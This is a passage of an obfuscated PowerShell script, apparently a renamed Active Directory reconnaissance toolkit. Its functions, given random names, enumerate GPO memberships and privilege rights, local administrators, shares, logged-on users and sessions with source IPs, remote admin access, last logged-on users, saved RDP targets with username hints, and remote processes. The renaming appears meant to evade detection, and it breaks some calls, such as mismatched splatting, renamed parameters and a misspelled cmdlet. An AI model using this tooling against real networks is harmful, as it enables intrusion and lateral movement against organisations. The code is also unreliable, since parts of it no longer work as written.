                    $Object = bicycled -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv $_ -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK

                    $9SYDBWzkfjbIXJZ = New-Object PSObject
                    $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'ComputerName' $kEneZcxTTiuFrPZ
                    $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'OU' $OU
                    $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName
                    $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath
                    $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'ObjectName' $Object.name
                    $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'ObjectSID' $_
                    $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -notmatch '805306368')
                    $9SYDBWzkfjbIXJZ 


                    if($Okpdr9DpyZPCXBG -and $9SYDBWzkfjbIXJZ.isGroup) {

                        confessedly -SID $_ -wD9BSmPbiJRFWDu -Okpdr9DpyZPCXBG -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Foreach-Object {

                            $xvSQOBla99tFHuZ = $_.distinguishedName


                            $xYut9BCXfRZcere = $xvSQOBla99tFHuZ.subString($xvSQOBla99tFHuZ.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                            if ($_.samAccountType -ne "805306368") {
                                $9scVBbYa99kMfRQ = $True
                            }
                            else {
                                $9scVBbYa99kMfRQ = $False
                            }

                            if ($_.samAccountName) {

                                $NwZdSwEDaYuWiBx = $_.samAccountName
                            }
                            else {

                                try {
                                    $NwZdSwEDaYuWiBx = die $_.cn
                                }
                                catch {

                                    $NwZdSwEDaYuWiBx = $_.cn
                                }
                            }

                            $9SYDBWzkfjbIXJZ = New-Object PSObject
                            $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'ComputerName' $kEneZcxTTiuFrPZ
                            $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'OU' $OU
                            $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName
                            $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath
                            $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'ObjectName' $NwZdSwEDaYuWiBx
                            $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'ObjectDN' $xvSQOBla99tFHuZ
                            $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'ObjectSID' $_.objectsid
                            $9SYDBWzkfjbIXJZ | Add-Member Noteproperty 'IsGroup' $9scVBbYa99kMfRQ
                            $9SYDBWzkfjbIXJZ 
                        }
                    }
                }
            }
        }
    }
}


function snowplows {


    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet("Domain","DC")]
        $anwWMQMaTAJPiLx ="Domain",

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $mcQZHcUBOH99UnL,

        [Switch]
        $9MCpeEay99VfrvP
    )

    if($anwWMQMaTAJPiLx -eq "Domain") {

        $GPO = Duracell -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -MUEYXRiBzadQKBt "{31B2F340-016D-11D2-945F-00C04FB984F9}"
        
        if($GPO) {

            $CuAlenb9adLl9Ut = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $tcSMIos9ejmE9ua =  @{
                'GptTmplPath' = $CuAlenb9adLl9Ut
                'UsePSDrive' = $9MCpeEay99VfrvP
            }


            sympathy @ParseArgs
        }

    }
    elseif($anwWMQMaTAJPiLx -eq "DC") {

        $GPO = Duracell -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -MUEYXRiBzadQKBt "{6AC1786C-016F-11D2-945F-00C04FB984F9}"

        if($GPO) {

            $CuAlenb9adLl9Ut = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $tcSMIos9ejmE9ua =  @{
                'GptTmplPath' = $CuAlenb9adLl9Ut
                'UsePSDrive' = $9MCpeEay99VfrvP
            }


            sympathy @ParseArgs | Foreach-Object {
                if($mcQZHcUBOH99UnL) {

                    $XeC99jRi99SJPbX = New-Object PSObject
                    $_.psobject.properties | Foreach-Object {
                        if( $_.Name -eq 'PrivilegeRights') {

                            $bphHX9kRvyuYjvC = New-Object PSObject


                            $_.Value.psobject.properties | Foreach-Object {

                                $Sids = $_.Value | Foreach-Object {
                                    try {
                                        if($_ -isnot [System.Array]) { 
                                            die $_ 
                                        }
                                        else {
                                            $_ | Foreach-Object { die $_ }
                                        }
                                    }
                                    catch {
                                        Write-Debug "Error resolving SID : $_"
                                    }
                                }

                                $bphHX9kRvyuYjvC | Add-Member Noteproperty $_.Name $Sids
                            }

                            $XeC99jRi99SJPbX | Add-Member Noteproperty 'PrivilegeRights' $bphHX9kRvyuYjvC
                        }
                        else {
                            $XeC99jRi99SJPbX | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    $XeC99jRi99SJPbX
                }
                else { $_ }
            }
        }
    }
}











function Brahms {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ = 'localhost',

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $SCQMhcOm9CdDHJg,

        [String]
        $hIqWczrXxNjFAmP = 'Administrators',

        [Switch]
        $kUfIAtEEdxcntnU,

        [Switch]
        $Okpdr9DpyZPCXBG
    )

    begin {
        if ((-not $kUfIAtEEdxcntnU) -and (-not $hIqWczrXxNjFAmP)) {

            $QPHLHCFxJXjCizO = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
            $qOGF99CSjdOENFi = $QPHLHCFxJXjCizO.Translate( [System.Security.Principal.NTAccount])
            $hIqWczrXxNjFAmP = ($qOGF99CSjdOENFi.Value).Split('\')[1]
        }
    }
    process {

        $TkWyPqTDSrecdpW = @()


        if($SCQMhcOm9CdDHJg) {
            $TkWyPqTDSrecdpW = Get-Content -Path $SCQMhcOm9CdDHJg
        }
        else {

            $TkWyPqTDSrecdpW += zone -Object $kEneZcxTTiuFrPZ
        }



        ForEach($JaseP9VXrHGQBRz in $TkWyPqTDSrecdpW) {
            try {
                if($kUfIAtEEdxcntnU) {

                    $SiEWnqfdNZWbTmF = [ADSI]"WinNT://$JaseP9VXrHGQBRz,computer"

                    $SiEWnqfdNZWbTmF.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                        $Group = New-Object PSObject
                        $Group | Add-Member Noteproperty 'Server' $JaseP9VXrHGQBRz
                        $Group | Add-Member Noteproperty 'Group' ($_.name[0])
                        $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                        $Group | Add-Member Noteproperty 'Description' ($_.Description[0])
                        $Group
                    }
                }
                else {

                    $hyl9sdZlHEVp9Fr = @($([ADSI]"WinNT://$JaseP9VXrHGQBRz/$hIqWczrXxNjFAmP").psbase.Invoke('Members'))

                    $hyl9sdZlHEVp9Fr | ForEach-Object {

                        $pFbKRRpgjtkaQEE = New-Object PSObject
                        $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'Server' $JaseP9VXrHGQBRz

                        $GazxKCLDhxrDzgZ = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $Null, $_, $Null)).Replace('WinNT://', '')


                        $Name = Seeger -OADAUGURRbgtTDp $GazxKCLDhxrDzgZ
                        if($Name) {
                            $FQDN = $Name.split("/")[0]
                            $Ca9IPwn9yoRLk9m = $GazxKCLDhxrDzgZ.split("/")[-1]
                            $Name = "$FQDN/$Ca9IPwn9yoRLk9m"
                            $dKegbxtrQhier9Q = $True
                        }
                        else {
                            $Name = $GazxKCLDhxrDzgZ
                            $dKegbxtrQhier9Q = $False
                        }

                        $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'AccountName' $Name


                        $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)



                        $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'Disabled' $( if(-not $dKegbxtrQhier9Q) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $Null, $_, $Null) } catch { 'ERROR' } } else { $False } )


                        $YOTyzqWneVgW9pU = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
                        $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'IsGroup' $YOTyzqWneVgW9pU
                        $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'IsDomain' $dKegbxtrQhier9Q
                        if($YOTyzqWneVgW9pU) {
                            $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'LastLogin' ""
                        }
                        else {
                            try {
                                $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))
                            }
                            catch {
                                $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'LastLogin' ""
                            }
                        }
                        $pFbKRRpgjtkaQEE



                        if($Okpdr9DpyZPCXBG -and $dKegbxtrQhier9Q -and $YOTyzqWneVgW9pU) {

                            $FQDN = $Name.split("/")[0]
                            $hIqWczrXxNjFAmP = $Name.split("/")[1].trim()

                            confessedly -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $FQDN -wD9BSmPbiJRFWDu -Okpdr9DpyZPCXBG | ForEach-Object {

                                $pFbKRRpgjtkaQEE = New-Object PSObject
                                $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'Server' "$FQDN/$($_.GroupName)"

                                $xvSQOBla99tFHuZ = $_.distinguishedName

                                $xYut9BCXfRZcere = $xvSQOBla99tFHuZ.subString($xvSQOBla99tFHuZ.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                                if ($_.samAccountType -ne "805306368") {
                                    $9scVBbYa99kMfRQ = $True
                                }
                                else {
                                    $9scVBbYa99kMfRQ = $False
                                }

                                if ($_.samAccountName) {

                                    $NwZdSwEDaYuWiBx = $_.samAccountName
                                }
                                else {
                                    try {

                                        try {
                                            $NwZdSwEDaYuWiBx = die $_.cn
                                        }
                                        catch {

                                            $NwZdSwEDaYuWiBx = $_.cn
                                        }
                                    }
                                    catch {
                                        Write-Debug "Error resolving SID : $_"
                                    }
                                }

                                $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'AccountName' "$xYut9BCXfRZcere/$NwZdSwEDaYuWiBx"
                                $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'SID' $_.objectsid
                                $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'Disabled' $False
                                $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'IsGroup' $9scVBbYa99kMfRQ
                                $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'IsDomain' $True
                                $pFbKRRpgjtkaQEE | Add-Member Noteproperty 'LastLogin' ''
                                $pFbKRRpgjtkaQEE
                            }
                        }
                    }
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function liberation {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ = 'localhost'
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }
    }

    process {


        $kEneZcxTTiuFrPZ = zone -Object $kEneZcxTTiuFrPZ


        $BKitfWQlbF9sHzs = 1
        $StuVy9ezZXaJBbx = [IntPtr]::Zero
        $TCNObpyq9ave9i9 = 0
        $rajuHaXjkgrDmPZ = 0
        $DAeFdDjeIcsoGyt = 0


        $txcsRvewcVdZtUk = $F9W9FHKlTrkmIUF::NetShareEnum($kEneZcxTTiuFrPZ, $BKitfWQlbF9sHzs, [ref]$StuVy9ezZXaJBbx, -1, [ref]$TCNObpyq9ave9i9, [ref]$rajuHaXjkgrDmPZ, [ref]$DAeFdDjeIcsoGyt)


        $EChkaBfKA9QH99A = $StuVy9ezZXaJBbx.ToInt64()

        Write-Debug "liberation result: $txcsRvewcVdZtUk"


        if (($txcsRvewcVdZtUk -eq 0) -and ($EChkaBfKA9QH99A -gt 0)) {


            $dJyNhvwvautuufH = $KiXuYcc9rQyepbg::GetSize()


            for ($i = 0; ($i -lt $TCNObpyq9ave9i9); $i++) {


                $mCfQDWiECVNepQq = New-Object System.Intptr -ArgumentList $EChkaBfKA9QH99A
                $Info = $mCfQDWiECVNepQq -as $KiXuYcc9rQyepbg

                $Info | Select-Object *
                $EChkaBfKA9QH99A = $mCfQDWiECVNepQq.ToInt64()
                $EChkaBfKA9QH99A += $dJyNhvwvautuufH
            }


            $Null = $F9W9FHKlTrkmIUF::NetApiBufferFree($StuVy9ezZXaJBbx)
        }
        else
        {
            switch ($txcsRvewcVdZtUk) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function cherubs {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ = 'localhost'
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }
    }

    process {


        $kEneZcxTTiuFrPZ = zone -Object $kEneZcxTTiuFrPZ


        $BKitfWQlbF9sHzs = 1
        $StuVy9ezZXaJBbx = [IntPtr]::Zero
        $TCNObpyq9ave9i9 = 0
        $rajuHaXjkgrDmPZ = 0
        $DAeFdDjeIcsoGyt = 0


        $txcsRvewcVdZtUk = $F9W9FHKlTrkmIUF::NetWkstaUserEnum($kEneZcxTTiuFrPZ, $BKitfWQlbF9sHzs, [ref]$StuVy9ezZXaJBbx, -1, [ref]$TCNObpyq9ave9i9, [ref]$rajuHaXjkgrDmPZ, [ref]$DAeFdDjeIcsoGyt)


        $EChkaBfKA9QH99A = $StuVy9ezZXaJBbx.ToInt64()

        Write-Debug "cherubs result: $txcsRvewcVdZtUk"


        if (($txcsRvewcVdZtUk -eq 0) -and ($EChkaBfKA9QH99A -gt 0)) {


            $dJyNhvwvautuufH = $TqmGRofbOJ9wzcD::GetSize()


            for ($i = 0; ($i -lt $TCNObpyq9ave9i9); $i++) {


                $mCfQDWiECVNepQq = New-Object System.Intptr -ArgumentList $EChkaBfKA9QH99A
                $Info = $mCfQDWiECVNepQq -as $TqmGRofbOJ9wzcD


                $Info | Select-Object *
                $EChkaBfKA9QH99A = $mCfQDWiECVNepQq.ToInt64()
                $EChkaBfKA9QH99A += $dJyNhvwvautuufH

            }


            $Null = $F9W9FHKlTrkmIUF::NetApiBufferFree($StuVy9ezZXaJBbx)
        }
        else
        {
            switch ($txcsRvewcVdZtUk) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function was {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ = 'localhost',

        [String]
        $IuM9ojehadqRMJF = ''
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }
    }

    process {


        $kEneZcxTTiuFrPZ = zone -Object $kEneZcxTTiuFrPZ


        $BKitfWQlbF9sHzs = 10
        $StuVy9ezZXaJBbx = [IntPtr]::Zero
        $TCNObpyq9ave9i9 = 0
        $rajuHaXjkgrDmPZ = 0
        $DAeFdDjeIcsoGyt = 0


        $txcsRvewcVdZtUk = $F9W9FHKlTrkmIUF::NetSessionEnum($kEneZcxTTiuFrPZ, '', $IuM9ojehadqRMJF, $BKitfWQlbF9sHzs, [ref]$StuVy9ezZXaJBbx, -1, [ref]$TCNObpyq9ave9i9, [ref]$rajuHaXjkgrDmPZ, [ref]$DAeFdDjeIcsoGyt)


        $EChkaBfKA9QH99A = $StuVy9ezZXaJBbx.ToInt64()

        Write-Debug "was result: $txcsRvewcVdZtUk"


        if (($txcsRvewcVdZtUk -eq 0) -and ($EChkaBfKA9QH99A -gt 0)) {


            $dJyNhvwvautuufH = $fsFNn9haqPXBWPN::GetSize()


            for ($i = 0; ($i -lt $TCNObpyq9ave9i9); $i++) {


                $mCfQDWiECVNepQq = New-Object System.Intptr -ArgumentList $EChkaBfKA9QH99A
                $Info = $mCfQDWiECVNepQq -as $fsFNn9haqPXBWPN


                $Info | Select-Object *
                $EChkaBfKA9QH99A = $mCfQDWiECVNepQq.ToInt64()
                $EChkaBfKA9QH99A += $dJyNhvwvautuufH

            }

            $Null = $F9W9FHKlTrkmIUF::NetApiBufferFree($StuVy9ezZXaJBbx)
        }
        else
        {
            switch ($txcsRvewcVdZtUk) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}


function krone {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ = 'localhost'
    )
    
    begin {
        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }
    }

    process {


        $kEneZcxTTiuFrPZ = zone -Object $kEneZcxTTiuFrPZ


        $eTyiOHagAnvppWe = $vJXcemdbVhNyNQC::WTSOpenServerEx($kEneZcxTTiuFrPZ)


        if ($eTyiOHagAnvppWe -ne 0) {

            Write-Debug "WTSOpenServerEx handle: $eTyiOHagAnvppWe"


            $BPpfIKS9xFe9MPY = [IntPtr]::Zero
            $DrUst9CvXq9Jy9O = 0
            

            $txcsRvewcVdZtUk = $vJXcemdbVhNyNQC::WTSEnumerateSessionsEx($eTyiOHagAnvppWe, [ref]1, 0, [ref]$BPpfIKS9xFe9MPY, [ref]$DrUst9CvXq9Jy9O)


            $EChkaBfKA9QH99A = $BPpfIKS9xFe9MPY.ToInt64()

            Write-Debug "WTSEnumerateSessionsEx result: $txcsRvewcVdZtUk"
            Write-Debug "pCount: $DrUst9CvXq9Jy9O"

            if (($txcsRvewcVdZtUk -ne 0) -and ($EChkaBfKA9QH99A -gt 0)) {


                $dJyNhvwvautuufH = $WuCrhpHJjhGgCyc::GetSize()


                for ($i = 0; ($i -lt $DrUst9CvXq9Jy9O); $i++) {
     


                    $mCfQDWiECVNepQq = New-Object System.Intptr -ArgumentList $EChkaBfKA9QH99A
                    $Info = $mCfQDWiECVNepQq -as $WuCrhpHJjhGgCyc

                    $EmM9FhhFncsFzjW = New-Object PSObject

                    if ($Info.pHostName) {
                        $EmM9FhhFncsFzjW | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                    }
                    else {

                        $EmM9FhhFncsFzjW | Add-Member Noteproperty 'ComputerName' $kEneZcxTTiuFrPZ
                    }

                    $EmM9FhhFncsFzjW | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                    if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {

                        $EmM9FhhFncsFzjW | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                    }
                    else {
                        $EmM9FhhFncsFzjW | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                    }

                    $EmM9FhhFncsFzjW | Add-Member Noteproperty 'ID' $Info.SessionID
                    $EmM9FhhFncsFzjW | Add-Member Noteproperty 'State' $Info.State

                    $QjxCw9FtcaOznxc = [IntPtr]::Zero
                    $QwwvCGVoXNUvhYh = 0



                    $IrkCfwyNTguJyTN = $vJXcemdbVhNyNQC::WTSQuerySessionInformation($eTyiOHagAnvppWe, $Info.SessionID, 14, [ref]$QjxCw9FtcaOznxc, [ref]$QwwvCGVoXNUvhYh)

                    $QL9eonTBUgjSCJf = $QjxCw9FtcaOznxc.ToInt64()
                    $uQSEsrrnkIZEsbt = New-Object System.Intptr -ArgumentList $QL9eonTBUgjSCJf
                    $Info2 = $uQSEsrrnkIZEsbt -as $gzrDetqtx9fJmNR

                    $yqPaYFV9bMQESwi = $Info2.Address       
                    if($yqPaYFV9bMQESwi[2] -ne 0) {
                        $yqPaYFV9bMQESwi = [String]$yqPaYFV9bMQESwi[2]+"."+[String]$yqPaYFV9bMQESwi[3]+"."+[String]$yqPaYFV9bMQESwi[4]+"."+[String]$yqPaYFV9bMQESwi[5]
                    }
                    else {
                        $yqPaYFV9bMQESwi = $Null
                    }

                    $EmM9FhhFncsFzjW | Add-Member Noteproperty 'SourceIP' $yqPaYFV9bMQESwi
                    $EmM9FhhFncsFzjW


                    $Null = $vJXcemdbVhNyNQC::WTSFreeMemory($QjxCw9FtcaOznxc)

                    $EChkaBfKA9QH99A += $dJyNhvwvautuufH
                }

                $Null = $vJXcemdbVhNyNQC::WTSFreeMemoryEx(2, $BPpfIKS9xFe9MPY, $DrUst9CvXq9Jy9O)
            }

            $Null = $vJXcemdbVhNyNQC::WTSCloseServer($eTyiOHagAnvppWe)
        }
        else {


            $Err = $Kernel32::GetLastError()
            Write-Verbuse "LastError: $Err"
        }
    }
}


function birdwatcher {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]
        $kEneZcxTTiuFrPZ = 'localhost'
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $LWin9zMVCuE99Q9 = 'Continue'
        }
    }

    process {


        $kEneZcxTTiuFrPZ = zone -Object $kEneZcxTTiuFrPZ



        $eTyiOHagAnvppWe = $vLUOHGFDci9WFUb::OpenSCManagerW("\\$kEneZcxTTiuFrPZ", 'ServicesActive', 0xF003F)

        Write-Debug "birdwatcher handle: $eTyiOHagAnvppWe"


        if ($eTyiOHagAnvppWe -ne 0) {

            $Null = $vLUOHGFDci9WFUb::CloseServiceHandle($eTyiOHagAnvppWe)
            $True
        }
        else {


            $Err = $Kernel32::GetLastError()
            Write-Debug "birdwatcher LastError: $Err"
            $False
        }
    }
}


function paralegals {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]        
        $kEneZcxTTiuFrPZ = "."
    )

    process {


        $kEneZcxTTiuFrPZ = zone -Object $kEneZcxTTiuFrPZ


        try {
            $Reg = [WMIClass]"\\$kEneZcxTTiuFrPZ\root\default:stdRegProv"
            $HKLM = 2147483650
            $Key = "SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
            $Value = "LastLoggedOnUser"
            $Reg.GetStringValue($HKLM, $Key, $Value).sValue
        }
        catch {
            Write-Warning "[!] Error opening remote registry on $kEneZcxTTiuFrPZ. Remote registry likely not enabled."
            $Null
        }
    }
}


function wights {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $kEneZcxTTiuFrPZ = "localhost",

        [String]
        $ozIEgLP9yBLONTb,

        [String]
        $qmPjaAatXLPifFS
    )

    begin {
        if ($ozIEgLP9yBLONTb -and $qmPjaAatXLPifFS) {
            $bGPW99RQpxRKQAC = $qmPjaAatXLPifFS | ConvertTo-SecureString -AsPlainText -Force
            $zbH9gtWqoSKXB9I = New-Object System.Management.Automation.PSCredential($ozIEgLP9yBLONTb,$bGPW99RQpxRKQAC)
        }


        $HKU = 2147483651
    }

    process {

        try {
            if($zbH9gtWqoSKXB9I) {
                $Reg = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $kEneZcxTTiuFrPZ -zbH9gtWqoSKXB9I $zbH9gtWqoSKXB9I -ErrorAction SilentlyContinue
            }
            else {
                $Reg = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $kEneZcxTTiuFrPZ -ErrorAction SilentlyContinue
            }
        }
        catch {
            Write-Warning "Error accessing $kEneZcxTTiuFrPZ, likely insufficient permissions or firewall rules on host"
        }

        if(!$Reg) {
            Write-Warning "Error accessing $kEneZcxTTiuFrPZ, likely insufficient permissions or firewall rules on host"
        }
        else {

            $DayEbeghSTzXbLi = ($Reg.EnumKey($HKU, "")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

            foreach ($OPaZV9ZgMywUcRV in $DayEbeghSTzXbLi) {

                try {
                    $IuM9ojehadqRMJF = die $OPaZV9ZgMywUcRV


                    $pnnftZkpPTMYydz = $Reg.EnumValues($HKU,"$OPaZV9ZgMywUcRV\Software\Microsoft\Terminal Server Client\Default").sNames

                    foreach ($zxLCfcoioatMKup in $pnnftZkpPTMYydz) {

                        if($zxLCfcoioatMKup -match 'MRU.*') {
                            $uDgMtYjFIQxRGmL = $Reg.GetStringValue($HKU, "$OPaZV9ZgMywUcRV\Software\Microsoft\Terminal Server Client\Default", $zxLCfcoioatMKup).sValue
                            
                            $XUErFHMLXOkSplg = New-Object PSObject
                            $XUErFHMLXOkSplg | Add-Member Noteproperty 'ComputerName' $kEneZcxTTiuFrPZ
                            $XUErFHMLXOkSplg | Add-Member Noteproperty 'UserName' $IuM9ojehadqRMJF
                            $XUErFHMLXOkSplg | Add-Member Noteproperty 'UserSID' $OPaZV9ZgMywUcRV
                            $XUErFHMLXOkSplg | Add-Member Noteproperty 'TargetServer' $uDgMtYjFIQxRGmL
                            $XUErFHMLXOkSplg | Add-Member Noteproperty 'UsernameHint' $Null
                            $XUErFHMLXOkSplg
                        }
                    }


                    $VlcnAuesoiLCARd = $Reg.EnumKey($HKU,"$OPaZV9ZgMywUcRV\Software\Microsoft\Terminal Server Client\Servers").sNames

                    foreach ($JaseP9VXrHGQBRz in $VlcnAuesoiLCARd) {

                        $MrzstOigNcKFTEQ = $Reg.GetStringValue($HKU, "$OPaZV9ZgMywUcRV\Software\Microsoft\Terminal Server Client\Servers\$JaseP9VXrHGQBRz", 'UsernameHint').sValue
                        
                        $XUErFHMLXOkSplg = New-Object PSObject
                        $XUErFHMLXOkSplg | Add-Member Noteproperty 'ComputerName' $kEneZcxTTiuFrPZ
                        $XUErFHMLXOkSplg | Add-Member Noteproperty 'UserName' $IuM9ojehadqRMJF
                        $XUErFHMLXOkSplg | Add-Member Noteproperty 'UserSID' $OPaZV9ZgMywUcRV
                        $XUErFHMLXOkSplg | Add-Member Noteproperty 'TargetServer' $JaseP9VXrHGQBRz
                        $XUErFHMLXOkSplg | Add-Member Noteproperty 'UsernameHint' $MrzstOigNcKFTEQ
                        $XUErFHMLXOkSplg   
                    }

                }
                catch {
                    Write-Debug "Error: $_"
                }
            }
        }
    }
}


function snowshed {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $kEneZcxTTiuFrPZ,

        [String]
        $ozIEgLP9yBLONTb,

        [String]
        $qmPjaAatXLPifFS
    )

    process {
        
        if($kEneZcxTTiuFrPZ) {

            $kEneZcxTTiuFrPZ = zone -Object $kEneZcxTTiuFrPZ          
        }
        else {

            $kEneZcxTTiuFrPZ = [System.Net.Dns]::GetHostName()
        }

        $zbH9gtWqoSKXB9I = $Null

        if($ozIEgLP9yBLONTb) {
            if($qmPjaAatXLPifFS) {
                $bGPW99RQpxRKQAC = $qmPjaAatXLPifFS | ConvertTo-SecureString -AsPlainText -Force
                $zbH9gtWqoSKXB9I = New-Object System.Management.Automation.PSCredential($ozIEgLP9yBLONTb,$bGPW99RQpxRKQAC)


                try {
                    Get-WMIobject -Class Win32_process -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -zbH9gtWqoSKXB9I $zbH9gtWqoSKXB9I | ForEach-Object {
                        $Owner = $_.getowner();
                        $SX9cIUZNlgUXvEw = New-Object PSObject
                        $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'ComputerName' $kEneZcxTTiuFrPZ
                        $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                        $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                        $SX9cIUZNlgUXvEw | Add-Member Noteproperty 'Domain' $Owner.Domain
